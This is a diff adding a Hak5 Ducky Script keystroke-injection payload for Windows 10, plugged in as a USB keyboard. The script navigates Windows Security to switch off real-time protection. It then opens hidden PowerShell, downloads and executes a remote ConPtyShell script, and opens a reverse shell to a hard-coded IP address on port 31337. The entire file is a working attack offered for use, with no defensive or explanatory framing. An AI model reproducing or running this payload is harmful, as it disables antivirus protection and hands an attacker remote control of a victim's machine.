@@ -1,0 +1,40 @@
+REM Title:         Disable_Windows10_Defender then Reverse Shell
+REM Description    Disable Windows Defender and Tamper protection on Windows 10
+REM Author:        Zero_Sploit with custom reverse shell
+REM Props:         Hak5 Team & WyteRyno
+REM Version:       1.0
+REM Target:        Windows 10
+REM Attackmodes:   HID
+DELAY 1000
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 1000
+STRING windows security
+DELAY 500
+ENTER
+DELAY 2000
+ENTER
+DELAY 1000
+REM Navigate to Manage Settings then turn off Realtime Protection
+TAB
+TAB
+TAB
+TAB
+DELAY 500
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W hidden
+DELAY 1000
+ENTER
+DELAY 200
+STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 147.185.243.147 31337
+DELAY 200
+ENTER
